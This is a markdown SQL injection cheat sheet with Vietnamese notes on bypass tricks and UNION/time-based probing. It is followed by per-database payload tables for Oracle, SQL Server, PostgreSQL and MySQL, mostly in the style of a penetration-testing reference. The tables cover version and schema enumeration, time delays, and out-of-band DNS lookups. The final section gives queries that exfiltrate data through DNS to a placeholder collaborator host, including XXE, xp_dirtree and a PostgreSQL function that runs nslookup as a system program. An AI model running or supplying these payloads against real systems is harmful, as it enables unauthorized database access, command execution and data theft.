# SQL_Injection
#### Untrusted data sẽ rơi vào câu lệnh query
#### có thể sử dụng dấu ; để thực thi nhiều câu lệnh query cùng lúc trong mysql 
#### mysql_query chỉ thực hiện được 1 câu lệnh query thôi, cùng tùy vào phiên bản
#### tùy vào câu lệnh mà dev dùng ta có thể sử dụng '-- - hoặc or 1 = '1 có thể sửu dụng dấu ' hoặc "
#### có thể trong câu lệnh truy vấn dev kh cùng (select username,passwd from user where username = "$username" and passwd = "$passwd") mà lại dùng (select username,passwd from user where username = "$username" sau đó mới đi so sánh passwd sau) thì lúc này dấu -- - và dấu OR vô nghĩa
#### thao túng (làm giả) kết quả trả về có thể dùng select a,b union select 1,2,.....
#### có thể không phải là 1,2 mà nên dùng NULL,NULL,....
#### thử từng cột xem cái nào là string cột nào là interger
#### có thể dùng thời gian ngủ (sleep) để 
# String concatenation
####  Oracle 	'foo'||'bar' 
####  Microsoft 	'foo'+'bar' 
####  PostgreSQL 	'foo'||'bar'
####  MySQL 	'foo' 'bar' 
####  CONCAT('foo','bar')
# Substring
####  Oracle 	SUBSTR('foobar', 4, 2)
####  Microsoft 	SUBSTRING('foobar', 4, 2)
####  PostgreSQL 	SUBSTRING('foobar', 4, 2)
####  MySQL 	SUBSTRING('foobar', 4, 2) 
# Comments
####  Oracle      --comment
####  Microsoft 	--comment
####              /*comment*/
####  PostgreSQL 	--comment
####             /*comment*/
####  MySQL 	#comment
####          -- comment 
####          /*comment*/
 # version
#### Oracle 	SELECT banner FROM v$version
####        SELECT version FROM v$instance
#### Microsoft 	SELECT @@version
#### PostgreSQL 	SELECT version()
#### MySQL 	SELECT @@version 
# Database contents
#### Oracle 	SELECT * FROM all_tables
####        SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
#### Microsoft 	SELECT * FROM information_schema.tables
####            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
#### PostgreSQL 	SELECT * FROM information_schema.tables
####            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
#### MySQL 	SELECT * FROM information_schema.tables
####        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
# Time Delays
#### Oracle 	dbms_pipe.receive_message(('a'),10)
#### Microsoft 	WAITFOR DELAY '0:0:10'
#### PostgreSQL 	SELECT pg_sleep(10)
#### MySQL 	SELECT SLEEP(10)
# DNS LOOKUP
#### Oracle 	

#### (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
#### SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

#### The following technique works on fully patched Oracle installations, but requires elevated privileges:
#### SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
#### Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
#### PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
#### MySQL 	

#### The following techniques work on Windows only:
#### LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
#### SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
# DNS lookup with data exfiltration
#### Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
#### Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
#### PostgreSQL 	create OR replace function f() returns void as $$
#### declare c text;
#### declare p text;
#### begin
#### SELECT into p (SELECT YOUR-QUERY-HERE);
#### c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
#### execute c;
#### END;
#### $$ language plpgsql security definer;
#### SELECT f();
#### MySQL 	The following technique works on Windows only:
#### SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
